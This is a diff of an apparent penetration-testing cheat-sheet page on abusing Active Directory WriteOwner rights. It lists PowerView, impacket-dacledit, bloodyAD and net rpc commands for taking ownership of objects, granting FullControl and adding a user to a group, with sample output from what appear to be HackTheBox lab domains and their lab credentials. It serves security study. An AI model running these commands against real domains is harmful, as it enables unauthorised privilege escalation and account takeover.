@@ -1,7 +1,7 @@
 ---
 title: "WriteOwner/Own"
-date: 2024-7-27
-tags: ["Writeowner", "Permissions", "Powerview", "Impacket", "AddMember", "Domain Controller", "Active Directory", "Windows", "Dacledit"]
+date: 2025-7-17
+tags: ["WriteOwner", "Permissions", "Powerview", "Impacket", "AddMember", "Domain Controller", "Active Directory", "Windows", "Dacledit", "Own"]
 ---
 
 ### Abuse #1 : Change Owner of the Group/User
@@ -14,18 +14,31 @@ tags: ["Writeowner", "Permissions", "Powerview", "Impacket", "AddMember", "Domai
 
 ```console
 # Password
-sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
+powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
+```
+
+```console {class="sample-code"}
+$ powerview 'CERTIFIED.HTB/judith.mader:judith09@DC01.CERTIFIED.HTB'                                  
+╭─LDAPS─[DC01.certified.htb]─[CERTIFIED\judith.mader]-[NS:<auto>]
+╰─PV ❯
 ```
 
 ```console
 # NTLM
-sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -H '<HASH>'
+powerview '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -H '<HASH>'
 ```
 
 #### 2. Change Owner
 
 ```console
 Set-DomainObjectOwner -TargetIdentity '<TARGET_IDENTITY>' -PrincipalIdentity '<TARGET_USER>'
+```
+
+```console {class="sample-code"}
+╭─LDAPS─[DC01.certified.htb]─[CERTIFIED\judith.mader]-[NS:<auto>]
+╰─PV ❯ Set-DomainObjectOwner -TargetIdentity 'Management' -PrincipalIdentity 'judith.mader'
+[2025-07-17 03:16:36] [Set-DomainObjectOwner] Changing current owner S-1-5-21-729746778-2675978091-3820388244-512 to S-1-5-21-729746778-2675978091-3820388244-1103
+[2025-07-17 03:16:36] [Set-DomainObjectOwner] Success! modified owner for CN=Management,CN=Users,DC=certified,DC=htb
 ```
 
 {{< /tabcontent >}}
@@ -67,17 +80,26 @@ Set-DomainObjectOwner -Identity '<TARGET_IDENTITY>' -OwnerIdentity '<TARGET_USER
 
 ```console
 # Password
-sudo ntpdate -s <DC> && impacket-dacledit '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal '<USER>' -target '<TARGET_IDENTITY>' -inheritance -action write -rights FullControl
+impacket-dacledit '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal '<USER>' -target '<TARGET_IDENTITY>' -inheritance -action write -rights FullControl
+```
+
+```console {class="sample-code"}
+$ impacket-dacledit 'CERTIFIED.HTB/judith.mader:judith09' -dc-ip DC01.CERTIFIED.HTB -principal 'judith.mader' -target 'Management' -inheritance -action write -rights FullControl
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
+[*] DACL backed up to dacledit-20250717-032157.bak
+[*] DACL modified successfully!
 ```
 
 ```console
 # NTLM
-sudo ntpdate -s <DC> && impacket-dacledit '<DOMAIN>/<USER>' -hashes ':<HASH>' -dc-ip <DC> -principal '<USER>' -target '<TARGET_IDENTITY>' -inheritance -action write -rights FullControl
+impacket-dacledit '<DOMAIN>/<USER>' -hashes ':<HASH>' -dc-ip <DC> -principal '<USER>' -target '<TARGET_IDENTITY>' -inheritance -action write -rights FullControl
 ```
 
 ```console
 # Kerberos
-sudo ntpdate -s <DC> && impacket-dacledit -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal '<USER>' -target '<TARGET_IDENTITY>' -inheritance -action write -rights FullControl
+sudo ntpdate -s <DC_IP> && impacket-dacledit '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC> -principal '<USER>' -target '<TARGET_IDENTITY>' -inheritance -action write -rights FullControl
 ```
 
 ```console {class="sample-code"}
@@ -98,6 +120,11 @@ Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its a
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll '<TARGET_IDENTITY>' '<USER>'
 ```
 
+```console {class="sample-code"}
+$ bloodyAD -d CERTIFIED.HTB -u 'judith.mader' -p 'judith09' --host DC01.CERTIFIED.HTB add genericAll 'Management' 'judith.mader'
+[+] judith.mader has now GenericAll on Management
+```
+
 ```console
 # NTLM
 bloodyAD -d <DOMAIN> -u '<USER>' -P ':<HASH>' -f rc4 --host <DC> add genericAll '<TARGET_IDENTITY>' '<USER>'
@@ -105,7 +132,7 @@ bloodyAD -d <DOMAIN> -u '<USER>' -P ':<HASH>' -f rc4 --host <DC> add genericAll 
 
 ```console
 # Kerberos
-bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add genericAll '<TARGET_IDENTITY>' '<USER>'
+sudo ntpdate -s <DC_IP> && bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add genericAll '<TARGET_IDENTITY>' '<USER>'
 ```
 
 ```console {class="sample-code"}
@@ -118,16 +145,31 @@ $ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.ab
 
 ```console
 # Password
-sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
+powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
+```
+
+```console {class="sample-code"}
+$ powerview 'CERTIFIED.HTB/judith.mader:judith09@DC01.CERTIFIED.HTB'                                  
+╭─LDAPS─[DC01.certified.htb]─[CERTIFIED\judith.mader]-[NS:<auto>]
+╰─PV ❯
 ```
 
 ```console
 # NTLM
-sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -H '<HASH>'
+powerview '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -H '<HASH>'
 ```
 
 ```console
 Add-DomainObjectAcl -TargetIdentity '<TARGET_IDENTITY>' -PrincipalIdentity '<USER>' -Rights fullcontrol
+```
+
+```console {class=sample-code}
+╭─LDAPS─[DC01.certified.htb]─[CERTIFIED\judith.mader]-[NS:<auto>]
+╰─PV ❯ Add-DomainObjectAcl -TargetIdentity 'Management' -PrincipalIdentity 'judith.mader' -Rights fullcontrol
+[2025-07-17 03:24:17] [Add-DomainObjectACL] Found target identity: CN=Management,CN=Users,DC=certified,DC=htb
+[2025-07-17 03:24:17] [Add-DomainObjectACL] Found principal identity: CN=Judith Mader,CN=Users,DC=certified,DC=htb
+[2025-07-17 03:24:17] Adding FullControl to S-1-5-21-729746778-2675978091-3820388244-1104
+[2025-07-17 03:24:17] [Add-DomainObjectACL] Success! Added ACL to CN=Management,CN=Users,DC=certified,DC=htb
 ```
 
 {{< /tabcontent >}}
@@ -139,7 +181,7 @@ Add-DomainObjectAcl -TargetIdentity '<TARGET_IDENTITY>' -PrincipalIdentity '<USE
 
 ```console
 # Request a TGT
-sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>'
+sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>'
 ```
 
 ```console {class="sample-code"}
@@ -159,7 +201,7 @@ $ export KRB5CCNAME=m.lovegod.ccache
 ```
 
 ```console
-sudo ntpdate -s <DC> && net rpc group addmem '<GROUP>' '<USER>' -U '<USER>' --use-kerberos=required -S <DC>
+sudo ntpdate -s <DC_IP> && net rpc group addmem '<GROUP>' '<USER>' -U '<USER>@<DOMAIN>%<PASSWORD>' --use-kerberos=required -S <DC>
 ```
 
 ```console {class="sample-code"}
@@ -175,6 +217,11 @@ Password for [WORKGROUP\m.lovegod]:
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
 
+```console {class="sample-code"}
+$ bloodyAD -d CERTIFIED.HTB -u 'judith.mader' -p 'judith09' --host DC01.CERTIFIED.HTB add groupMember 'Management' 'judith.mader'
+[+] judith.mader added to Management
+```
+
 ```console
 # NTLM
 bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> add groupMember '<GROUP>' '<USER>'
@@ -182,7 +229,7 @@ bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> add groupMember
 
 ```console
 # Kerberos
-bloodyAD -k -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
+sudo ntpdate -s <DC_IP> && bloodyAD -k -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
 
 ```console {class="sample-code"}
@@ -205,7 +252,7 @@ Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'
 {{< tabcontent set2-3 tab1 >}}
 
 ```console
-sudo ntpdate -s <DC> && net rpc group members '<GROUP>' -U '<USER>' --use-kerberos=required -S <DC>
+sudo ntpdate -s <DC_IP> && net rpc group members '<GROUP>' -U '<USER>@<DOMAIN>%<PASSWORD>' --use-kerberos=required -S <DC>
 ```
 
 ```console {class="sample-code"}
@@ -223,6 +270,24 @@ absolute\svc_audit
 Get-DomainGroupMember -Identity '<GROUP>'
 ```
 
+```console {class="sample-code"}
+╭─LDAPS─[DC01.certified.htb]─[CERTIFIED\judith.mader]-[NS:<auto>]
+╰─PV ❯ Get-DomainGroupMember -Identity 'Management'
+GroupDomainName             : Management
+GroupDistinguishedName      : CN=Management,CN=Users,DC=certified,DC=htb
+MemberDomain                : certified.htb
+MemberName                  : judith.mader
+MemberDistinguishedName     : CN=Judith Mader,CN=Users,DC=certified,DC=htb
+MemberSID                   : S-1-5-21-729746778-2675978091-3820388244-1103
+
+GroupDomainName             : Management
+GroupDistinguishedName      : CN=Management,CN=Users,DC=certified,DC=htb
+MemberDomain                : certified.htb
+MemberName                  : management_svc
+MemberDistinguishedName     : CN=management service,CN=Users,DC=certified,DC=htb
+MemberSID                   : S-1-5-21-729746778-2675978091-3820388244-1105
+```
+
 {{< /tabcontent >}}
 {{< tabcontent set2 tab2 >}}
 
@@ -236,7 +301,7 @@ Get-DomainGroupMember -Identity '<GROUP>'
 *Evil-WinRM* PS C:\Users\maria> . .\PowerView.ps1
 ```
 
-#### 2. Create a Cred Object (runas) \[optional\]
+#### 2. Create a Cred Object (runas) \[Optional\]
 
 ```console
 $username = '<DOMAIN>\<USER>'
